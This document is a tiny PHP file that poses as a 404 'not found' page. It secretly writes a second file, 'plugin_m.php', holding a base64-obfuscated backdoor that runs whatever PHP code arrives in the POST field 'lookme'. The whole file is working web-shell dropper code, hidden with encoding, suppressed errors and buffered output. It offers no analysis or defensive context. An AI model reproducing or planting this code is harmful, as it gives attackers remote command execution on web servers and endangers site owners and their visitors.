<?php
	header('HTTP/1.1 404');
	ob_start();
	@fputs(fopen(base64_decode('cGx1Z2luX20ucGhw'),w),base64_decode('PD9waHAgQGFzc2VydCgkX1BPU1RbJ2xvb2ttZSddKTs/Pg=='));
	ob_end_clean();
?>